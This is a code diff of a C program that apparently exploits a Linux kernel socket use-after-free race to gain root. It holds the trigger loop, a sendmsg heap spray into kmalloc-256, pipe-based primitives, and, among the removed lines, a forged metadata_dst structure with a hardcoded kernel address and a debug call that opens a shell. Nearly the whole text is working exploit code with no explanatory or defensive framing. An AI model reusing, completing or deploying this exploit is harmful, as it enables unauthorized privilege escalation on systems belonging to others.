@@ -27,8 +27,6 @@
 #include <arpa/inet.h>
 #include <root_payload.h>
 
-#include "rtable.h"
-
 typedef uint64_t u64;
 typedef int64_t i64;
 typedef uint32_t u32;
@@ -152,7 +150,7 @@ void pipe_prefault(Pipe *pipe) {
     CHECK(read(pipe->read_fd, &buf, sizeof(buf)), sizeof(buf));
 }
 
-#define NUM_SPRAY 0x900
+#define NUM_SPRAY 0x400
 #define SPRAY_SIZE 0x100
 
 // sendmsg spray adapted from CVE-2023-3609 exploit
@@ -265,87 +263,22 @@ void reset_spray() {
     atomic_store(&spray_count, 0);
 }
 
-// spins until socket has error
-int wait_for_socket_error(int socket_fd) {
-    for (;;) {
-        int error = 0;
-        socklen_t len = sizeof(error);
-        SYSCHK(getsockopt(socket_fd, SOL_SOCKET, SO_ERROR, &error, &len));
-        if (error != 0) {
-            return error;
-        }
-    }
-}
+int open_connected_ipv6_udp_socket() {
+    int socket_fd = SYSCHK(socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP));
 
-int open_connected_ipv4_udp_socket(const char *address_str) {
-    int socket_fd = SYSCHK(socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP));
-
-    struct sockaddr_in addr = { 0 };
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(6767);
-    SYSCHK(inet_pton(AF_INET, address_str, &addr.sin_addr));
+    struct sockaddr_in6 addr = { 0 };
+    addr.sin6_family = AF_INET6;
+    addr.sin6_port = htons(1337);
+    SYSCHK(inet_pton(AF_INET6, "::1", &addr.sin6_addr));
 
     SYSCHK(connect(socket_fd, (struct sockaddr*)&addr, sizeof(addr)));
 
     return socket_fd;
 }
 
-int open_vuln_ipv4_udp_socket() {
-    int socket_fd = open_connected_ipv4_udp_socket("192.168.10.1");
-
-    // setting this mode means packets are always sent as non fragmentable
-    int mode = IP_PMTUDISC_DO;
-    SYSCHK(setsockopt(socket_fd, IPPROTO_IP, IP_MTU_DISCOVER, &mode, sizeof(mode)));
-
-    // do send to trigger actual icmp packet to arrive and get dst_cache in a state where it can be freed
-    // this should be below mtu limit server will send
-    // this doesn't seem to matter, and still puts the socket in the right state to trigger later free
-    u8 buf[256] = { 0 };
-    SYSCHK(send(socket_fd, buf, sizeof(buf), 0));
-    assert(wait_for_socket_error(socket_fd) == EMSGSIZE);
-
-    return socket_fd;
-}
-
-int testing_trigger_vuln() {
-    int socket_fd = open_connected_ipv4_udp_socket("192.168.10.1");
-
-    // // send 512 will trigger icmp send with some delay
-    // u8 buf[512] = { 0 };
-    // SYSCHK(send(socket_fd, buf, sizeof(buf), 0));
-
-    // temporary debug trigger
-    // int sixseven = 67;
-    // int sixnine = 69;
-    // SYSCHK(setsockopt(socket_fd, SOL_SOCKET, SO_CNX_ADVICE, &sixnine, sizeof(sixnine)));
-    // SYSCHK(setsockopt(socket_fd, SOL_SOCKET, SO_CNX_ADVICE, &sixseven, sizeof(sixseven)));
-
-    return socket_fd;
-}
-
-// broadcast socket only has 1 ref for its rtinfo
-int open_broadcst_socket() {
-    int socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
-    int one = 1;
-    SYSCHK(setsockopt(socket_fd, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one)));
-
-    struct sockaddr_in bcast = {
-        .sin_family = AF_INET,
-        .sin_port = htons(6767),
-    };
-    inet_pton(AF_INET, "192.168.10.255", &bcast.sin_addr);
-
-    SYSCHK(connect(socket_fd, (struct sockaddr *)&bcast, sizeof(bcast)));
-
-    return socket_fd;
-
-    // idt needed?
-    // send(socket_a, "A", 1, 0);   // populate sk_dst_cache
-}
-
 void open_many_sockets(int *fd_array, usize len) {
     for (usize i = 0; i < len; i++) {
-        fd_array[i] = open_broadcst_socket();
+        fd_array[i] = open_connected_ipv6_udp_socket();
     }
 }
 
@@ -593,8 +526,6 @@ void *run_trigger_thread(void *arg) {
 
 void try_run_main_exploit(TriggerCtx *ctx);
 
-#define DEBUG
-
 void trigger_vuln_loop() {
     // setup spray threads before anything else
     setup_spray();
@@ -613,7 +544,6 @@ void trigger_vuln_loop() {
         .timer_offset = 20000,
     };
 
-#ifndef DEBUG
     // this thread will spin on cpu1 forever
     SYSCHK(pthread_create(&cpu1_block_thread, NULL, run_cpu1_block_thread, (void *) &ctx));
 
@@ -623,31 +553,15 @@ void trigger_vuln_loop() {
     // wait for trigger thread tid to become available
     while (atomic_load(&ctx.trigger_thread) == 0) {}
     pid_t trigger_pid = atomic_load(&ctx.trigger_thread);
-#endif
 
     usize iteration_count = 0;
     usize too_long_count = 0;
 
     // spray sockets for setup
     open_many_sockets(ctx.pre_sockets, NUM_PRE_SOCKETS);
-#ifdef DEBUG
-    LOG("start trigger");
-    ctx.vuln_socket = testing_trigger_vuln();
-#else
-    ctx.vuln_socket = open_vuln_ipv4_udp_socket();
-#endif
+    ctx.vuln_socket = open_connected_ipv6_udp_socket();
     open_many_sockets(ctx.post_sockets, NUM_POST_SOCKETS);
 
-#ifdef DEBUG
-    int sixseven = 67;
-    int sixnine = 69;
-    SYSCHK(setsockopt(ctx.vuln_socket, SOL_SOCKET, SO_CNX_ADVICE, &sixnine, sizeof(sixnine)));
-    SYSCHK(setsockopt(ctx.vuln_socket, SOL_SOCKET, SO_CNX_ADVICE, &sixseven, sizeof(sixseven)));
-    LOG("debug triggered");
-    sleep(1);
-
-    try_run_main_exploit(&ctx);
-#else
     for (;;) {
         // adjust timerfd timing based on previous runs
         if (iteration_count == 5) {
@@ -685,14 +599,14 @@ void trigger_vuln_loop() {
 
         int mtu = 0;
         socklen_t mtu_len = sizeof(mtu);
-        if (getsockopt(ctx.vuln_socket, IPPROTO_IP, IP_MTU, &mtu, &mtu_len) == -1) {
+        if (getsockopt(ctx.vuln_socket, SOL_IPV6, IPV6_MTU, &mtu, &mtu_len) == -1) {
             LOG("FAIL: race window too long");
             // race failed: too long
             too_long_count += 1;
 
             // reset just the vuln socket, sprayed sockets don't need to be reset
             SYSCHK(close(ctx.vuln_socket));
-            ctx.vuln_socket = open_vuln_ipv4_udp_socket();
+            ctx.vuln_socket = open_connected_ipv6_udp_socket();
 
             continue;
         }
@@ -706,13 +620,12 @@ void trigger_vuln_loop() {
 
         // if we returned, setup sockets for retry
         open_many_sockets(ctx.pre_sockets, NUM_PRE_SOCKETS);
-        ctx.vuln_socket = open_vuln_ipv4_udp_socket();
+        ctx.vuln_socket = open_connected_ipv6_udp_socket();
         open_many_sockets(ctx.post_sockets, NUM_POST_SOCKETS);
 
         // also prepare spray again
         reset_spray();
     }
-#endif
 }
 
 // returns on failure, should be retried
@@ -744,34 +657,7 @@ void try_run_main_exploit(TriggerCtx *ctx) {
     close_fds(ctx->pre_sockets, NUM_PRE_SOCKETS);
     close_fds(ctx->post_sockets, NUM_POST_SOCKETS);
 
-    // cause rcu to free rt6 info
-    sleep(1);
-
     // TODO: setup payload we want to spray
-    struct metadata_dst *dst_entry = (struct metadata_dst *) (payload + 64);
-    dst_entry->dst.dev = NULL;
-    dst_entry->dst.obsolete = 1;
-    dst_entry->dst.__refcnt.counter = 1;
-    // blackhole ops
-    dst_entry->dst.ops = (struct dst_ops *) 0xffffffff836a8e40;
-    dst_entry->dst.flags = 0xffff;
-    // just has to not be 0 (METADATA_IP_TUNNEL)
-    dst_entry->type = METADATA_HW_PORT_MUX;
-
-    // can still write to 128 with no wraparound, dst_entry is 112 big, metadata_dst is 116
-    // cannot have, dev overlaps with refcount, and refcnt cannot be null
-    // dst_entry = (struct metadata_dst *) (payload + 128);
-    // dst_entry->dst.dev = NULL;
-    // dst_entry->dst.obsolete = 1;
-    // dst_entry->dst.__refcnt.counter = 1;
-    // // blackhole ops
-    // dst_entry->dst.ops = (struct dst_ops *) 0xffffffff836a8e40;
-    // dst_entry->dst.flags = 0xffff;
-    // // just has to not be 0 (METADATA_IP_TUNNEL)
-    // dst_entry->type = METADATA_HW_PORT_MUX;
-
-    // cannot have one at 196 offset, counter overlaps with sendmsg length, so refcount dec will never free
-
     // after spray, dst_cache hopefully reclaimed
     LOG("spray kmalloc-256...");
     do_spray();
@@ -825,10 +711,6 @@ void try_run_main_exploit(TriggerCtx *ctx) {
         for (usize i = 0; i < NUM_VULN_PIPES; i++) {
             pipe_close(&vuln_pipes[i]);
         }
-
-        // TODO: remove
-        // just for debugging
-        system("/bin/sh");
 
         SYSCHK(close(ctx->vuln_socket));
 
@@ -901,79 +783,6 @@ void try_run_main_exploit(TriggerCtx *ctx) {
     while (1) {
         sleep(1000);
     }
-}
-
-void test() {
-    // ipv6 bug trial
-    // int fd = open_connected_ipv6_udp_socket();
-
-    // int mtu = 0;
-    // socklen_t mtu_len = sizeof(mtu);
-    // LOG("%d", getsockopt(fd, SOL_IPV6, IPV6_MTU, &mtu, &mtu_len));
-
-    // int one = 1;
-    // // don't check result, socket might be closed
-    // setsockopt(fd, SOL_SOCKET, SO_CNX_ADVICE, &one, sizeof(one));
-
-    // LOG("%d", getsockopt(fd, SOL_IPV6, IPV6_MTU, &mtu, &mtu_len));
-
-    // int fd = open_connected_ipv4_udp_socket();
-
-    // // setting this mode means packets are always sent as non fragmentable
-    // int mode = IP_PMTUDISC_DO;
-    // SYSCHK(setsockopt(fd, IPPROTO_IP, IP_MTU_DISCOVER, &mode, sizeof(mode)));
-
-    // u8 buf[1400] = { 0 };
-    // SYSCHK(send(fd, buf, sizeof(buf), 0));
-
-    for (usize i = 0; i < 16; i++) {
-        LOG("test round: %lu", i + 1);
-        int fd = open_vuln_ipv4_udp_socket();
-
-        int mtu = 0;
-        socklen_t mtu_len = sizeof(mtu);
-        LOG("%d", getsockopt(fd, IPPROTO_IP, IP_MTU, &mtu, &mtu_len));
-
-        int one = 1;
-        // don't check result, socket might be closed
-        setsockopt(fd, SOL_SOCKET, SO_CNX_ADVICE, &one, sizeof(one));
-
-        LOG("%d", getsockopt(fd, IPPROTO_IP, IP_MTU, &mtu, &mtu_len));
-    }
-}
-
-void test2() {
-    LOG("starting test");
-    for (usize i = 0; i < 4; i++) {
-        LOG("socket: %lu", i);
-        int socket_a = socket(AF_INET, SOCK_DGRAM, 0);
-        int one = 1;
-        SYSCHK(setsockopt(socket_a, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one)));
-
-        struct sockaddr_in bcast = {
-            .sin_family = AF_INET,
-            .sin_port = htons(6767),
-        };
-        inet_pton(AF_INET, "192.168.10.255", &bcast.sin_addr);
-
-        SYSCHK(connect(socket_a, (struct sockaddr *)&bcast, sizeof(bcast)));
-
-        send(socket_a, "A", 1, 0);   // populate sk_dst_cache
-    }
-
-    // int fd = socket(AF_INET, SOCK_DGRAM, 0);
-
-    // /* Must be done before the bug. First bind is allowed here. */
-    // setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, "eth0", 5);
-
-    // struct sockaddr_in sa = {
-    //     .sin_family = AF_INET,
-    //     .sin_port = htons(31337),
-    // };
-    // inet_pton(AF_INET, "192.168.1.10", &sa.sin_addr);   /* host's own IPv4 on this VM */
-
-    // SYSCHK(connect(fd, (struct sockaddr *)&sa, sizeof(sa)));
-    // send(fd, "A", 1, 0);   /* populate sk_dst_cache */
 }
 
 /**
@@ -1049,14 +858,9 @@ int main() {
     set_hard_file_limit(16384);
     set_soft_file_limit(16384);
 
-    // test2();
-    // return 0;
-
     pin_to_cpu(0);
 
     trigger_vuln_loop();
-
-    puts("done");
 
     return 0;
 }
